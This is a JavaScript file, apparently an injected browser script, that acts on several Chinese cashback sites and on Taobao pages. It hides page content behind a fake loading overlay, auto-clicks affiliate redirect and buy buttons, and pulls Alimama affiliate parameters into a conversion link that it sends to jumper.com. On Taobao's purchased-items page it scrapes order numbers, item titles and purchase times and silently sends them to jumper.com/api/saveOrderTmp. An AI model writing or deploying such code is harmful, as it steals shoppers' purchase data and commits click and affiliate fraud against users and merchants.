var zheDomain = 'http://www.jumper.com';

function zheLoadit(src) {
	var head = document.getElementsByTagName('head')[0];
	var script = document.createElement('script');
	script.type = 'text/javascript';
	script.src = src + '&' + Math.random();
	head.appendChild(script);
}

function zheInsertLoading() {

	var body = document.getElementsByTagName('body')[0];
	var d = document.createElement('div');
	d.id = 'mask_id_dv';
	body.appendChild(d);
	var characterSet = 'utf8';
	if(navigator.appName=="Netscape"){
		if(document.characterSet!="UTF-8"){
			characterSet = 'gbk';
		}
	}else{
	    if(document.charset.toUpperCase()!="UTF-8"){
	     	characterSet = 'gbk';
	    }
	}
	if(characterSet == 'utf8'){
		document.getElementById('mask_id_dv').innerHTML = '<div style="position:fixed; top:0; left:0; z-index:100000000000; width:100%; height:100%; background:#FFF;text-align:center"><br /><br /><br /><br /><br /><br /><br /><br /><h2 style="height:30px">跳转中，请稍等 ...</h2><img src="' + zheDomain + '/loading.gif"></div>';
	}else{
		document.getElementById('mask_id_dv').innerHTML = '<div style="position:fixed; top:0; left:0; z-index:100000000000; width:100%; height:100%; background:#FFF;text-align:center"><br /><br /><br /><br /><br /><br /><br /><br /><h2 style="height:30px">Loading ...</h2><img src="' + zheDomain + '/loading.gif"></div>';
	}
}

function zheGetConvert(iid) {

	if(!window.alimamatk_show)return;
	if(!iid)return;
	if(!KSLITE)return;

	window.iid = iid;
	KSLITE.provide(["tkapi-main"],
	function(c) {

		if(!c("tkapi-config").r.cache.et)return;
		var f = [];

		function g(i, h) {
			if ( !! h) {
			f.push(i + (i ? "=": "") + h)
			}
		}
		call_back_fun = 'jsonp_callback_' + Math.random().toString().replace(".", "");
		g('cb', call_back_fun);
		g('ak', c("tkapi-config").r.cache.ak);
		g('pid', c("tkapi-config").r.cache.pid);
		g('unid', '0');
		g('wt', '0');
		g('tl', '290x380');
		g('rd', '1');
		//g('ct', encodeURIComponent('itemid='+c("tkapi-util").getAttrs($('.goto a')[0]).biz.itemid));
		g('ct', encodeURIComponent('itemid='+window.iid));
		//g('st', '2');
		g('rf', encodeURIComponent(c("tkapi-config").r.cache.ref));
		g('et', c("tkapi-config").r.cache.et);
		g('pgid', c("tkapi-config").r.cache.pgid);
		//g('v', '2.0'); 用display模式用2.0
		g('v', '1.1');
		//window[call_back_fun] = function(y, x) {
		//    jsonp_callback(y, x)
		//};
		zheGetConvertCB(c("tkapi-config").c.alimama + 'q?' + f.join('&'));
	})
}

function zheGetConvertCB(slink) {
	window.zheHasRequesResult = true;
	zheLoadit(zheDomain + '/api/getTaskResultJs/' + zheArgs['taskid'] + '?link_origin=' + encodeURIComponent(slink) + '&debug=false');
}

function loadForceJump() {
	zheLoadit(zheDomain + '/api/getTaskResultJs/' + zheArgs['taskid'] + '?link_origin=give_up&force=1&debug=false');
}

function zhePasteUrl(url){

	var p_zheArgs = new Object();
	if(!url)
		var p_zheQuery = location.search.substring(1); // Get url string
	else
		var p_zheQuery = url.substring(url.indexOf('?')+1);

	var p_zhePairs = p_zheQuery.split("&"); // Break at ampersand

	for (var i = 0; i < p_zhePairs.length; i++) {
		var pos = p_zhePairs[i].indexOf('='); // Look for "name=value"
		if (pos == -1) continue; // If not found, skip
		var argname = p_zhePairs[i].substring(0, pos); // Extract the name
		var value = p_zhePairs[i].substring(pos + 1); // Extract the value
		value = decodeURIComponent(value); // Decode it, if needed
		if (value && value != 'undefined') {
			p_zheArgs[argname] = value; // Store as a property
		} else {
			p_zheArgs[argname] = 0; // Store as a property
		}
	}

	return p_zheArgs;
}

var zheHost = location.host;
var zheHref = location.href;
var zheArgs = zhePasteUrl('');


if (navigator.userAgent.indexOf("MSIE") > 0)
	is_ie = true;
else
	is_ie = false;

var zheCount = 1;
window.zheHasRequesResult = false;


if (zheHost == 'fun.51fanli.com' && zheHref.indexOf('goshopapi') > 0) {

	zheInsertLoading();
	document.getElementsByTagName('div')[0].style.display = 'none';
	document.getElementsByTagName('div')[1].style.display = 'none';

}if (zheHost == 'fun.51fanli.com' && zheHref.indexOf('goshop') > 0) {

	document.getElementsByClassName('fanli-logo')[0].style.display = 'none';
	var i = setInterval(function() {

		if(window.zheHasRequesResult == false){

			if(window.top.document.getElementById("writeable_iframe_0")){

				var topWin = window.top.document.getElementById("writeable_iframe_0").contentWindow;
				objs = topWin.document.getElementsByTagName('a');
				for(i in objs){
					if(objs[i].href.indexOf('redirect.simba.taobao.com')>0){
						objs[i].click();
						window.zheHasRequesResult = true;
					}
				}
			}
		}
	}, 100);

} else if (zheHost == 'www.baobeisha.com' && zheHref.indexOf('taskid') > 0) {

	zheInsertLoading();
	var i = setInterval(function() {

		zheCount = zheCount + 1;
		if (zheCount == 50) { //5秒容忍度
			loadForceJump();
			clearInterval(i);
		}

		if(window.zheHasRequesResult == false)
			zheGetConvert($('.pointer').attr('biz-itemid'), i);

	}, 100);

} else if (zheHost == 'www.jsfanli.com' && zheHref.indexOf('taskid') > 0) {

	zheInsertLoading();
	var i = setInterval(function() {

		zheCount = zheCount + 1;
		if (zheCount == 50) { //5秒容忍度
			loadForceJump();
			clearInterval(i);
		}

		if(window.zheHasRequesResult == false)
			zheGetConvert($('.pointer').attr('biz-itemid'), i);

	}, 100);

}else if (zheHost == 'fanli.juanpi.com' && zheHref.indexOf('taskid') > 0) {

	zheInsertLoading();
	var i = setInterval(function() {

		zheCount = zheCount + 1;
		if (zheCount == 100) { //10秒容忍度
			loadForceJump();
			clearInterval(i);
		}

		if(window.zheHasRequesResult == false)
			zheGetConvert($('.tb_span a').attr('biz-itemid'), i);

	}, 100);

} else if ( zheHost == 'www.fanxian.com' && zheHref.indexOf('taskid') > 0) {

	zheInsertLoading();

	var i = setInterval(function() {

		zheCount = zheCount + 1;
		if (zheCount == 100) { //10秒容忍度
			loadForceJump();
			clearInterval(i);
		}

		if(window.zheHasRequesResult == false)
			zheGetConvert(zheArgs['gid'], i);

	}, 100);

} else if (zheHost == 're.taobao.com' && zheHref.indexOf('unid') > 0) {

	try{
		obj = document.getElementsByClassName('btnBuy');
	}catch(e){
		obj = document.querySelectorAll('.btnBuy');
	}

	obj[0].target="_self";
	obj[0].click();

} else if (zheHost == 'trade.taobao.com' && (zheHref.indexOf('list_bought_items') > 0 || zheHref.indexOf('listBoughtItems') > 0)) {

	try{
		obj_o = document.getElementsByClassName('order-num');
		obj_t = document.getElementsByClassName('deal-time');
		obj_b = document.getElementsByClassName('baobei-name');
	}catch(e){
		obj_o = document.querySelectorAll('.order-num');
		obj_t = document.querySelectorAll('.deal-time');
		obj_b = document.querySelectorAll('.baobei-name');
	}

	var item = '';
	for(i in obj_o){

		if(!isNaN(i)) {

			order_num = obj_o[i].innerHTML;
			buy_time = obj_t[i].innerHTML.substr(5);
			title = obj_b[i].innerHTML.substr(0, 20);

			d1 = new Date('2013/10/31 00:00:00');
			d2 = new Date('2013/11/16 00:00:00');
			d3 = new Date(buy_time.replace(/-/g, "/"));

			if(Date.parse(d1) < Date.parse(d3) && Date.parse(d3) < Date.parse(d2)){
				item += order_num.replace(/[\r\n]/g, "") + '::' + title.replace(/[\r\n]/g, "") + '::' + buy_time.replace(/[\r\n]/g, "") + ',,';
			}
		}
	}

	zheLoadit(zheDomain + '/api/saveOrderTmp?d=' + item);
}